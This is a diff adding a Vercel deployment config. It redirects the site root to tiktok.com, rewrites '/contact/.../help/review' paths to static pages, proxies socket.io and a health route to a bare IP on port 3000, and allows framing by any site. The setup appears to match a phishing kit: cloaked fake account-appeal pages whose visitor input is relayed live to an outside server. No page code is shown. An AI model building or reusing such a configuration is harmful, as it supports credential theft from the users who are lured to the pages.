@@ -1,0 +1,95 @@
+{
+    "$schema": "https://openapi.vercel.sh/vercel.json",
+    "framework": null,
+    "buildCommand": null,
+    "installCommand": null,
+    "outputDirectory": ".",
+    "redirects": [
+        {
+            "source": "/",
+            "destination": "https://www.tiktok.com",
+            "permanent": false
+        }
+    ],
+    "rewrites": [
+        {
+            "source": "/contact/:slug/help/review",
+            "destination": "/contact/0/help/review/index.html"
+        },
+        {
+            "source": "/contact/:slug/help/review/",
+            "destination": "/contact/0/help/review/index.html"
+        },
+        {
+            "source": "/contact/:slug/help",
+            "destination": "/contact/0/help/index.html"
+        },
+        {
+            "source": "/contact/:slug/help/",
+            "destination": "/contact/0/help/index.html"
+        },
+        {
+            "source": "/contact/:slug",
+            "destination": "/contact/0/index.html"
+        },
+        {
+            "source": "/contact/:slug/",
+            "destination": "/contact/0/index.html"
+        },
+        {
+            "source": "/ui/contact/:slug/help/review",
+            "destination": "/ui/contact/0/help/review/index.html"
+        },
+        {
+            "source": "/ui/contact/:slug/help/review/",
+            "destination": "/ui/contact/0/help/review/index.html"
+        },
+        {
+            "source": "/ui/contact/:slug/help",
+            "destination": "/ui/contact/0/help/index.html"
+        },
+        {
+            "source": "/ui/contact/:slug/help/",
+            "destination": "/ui/contact/0/help/index.html"
+        },
+        {
+            "source": "/ui/contact/:slug",
+            "destination": "/ui/contact/0/index.html"
+        },
+        {
+            "source": "/ui/contact/:slug/",
+            "destination": "/ui/contact/0/index.html"
+        },
+        {
+            "source": "/socket.io",
+            "destination": "http://167.104.101.54:3000/socket.io/"
+        },
+        {
+            "source": "/socket.io/",
+            "destination": "http://167.104.101.54:3000/socket.io/"
+        },
+        {
+            "source": "/socket.io/:path*",
+            "destination": "http://167.104.101.54:3000/socket.io/:path*"
+        },
+        {
+            "source": "/vps-health",
+            "destination": "http://167.104.101.54:3000/health"
+        }
+    ],
+    "headers": [
+        {
+            "source": "/(.*)",
+            "headers": [
+                {
+                    "key": "Content-Security-Policy",
+                    "value": "frame-ancestors *"
+                },
+                {
+                    "key": "X-Content-Type-Options",
+                    "value": "nosniff"
+                }
+            ]
+        }
+    ]
+}
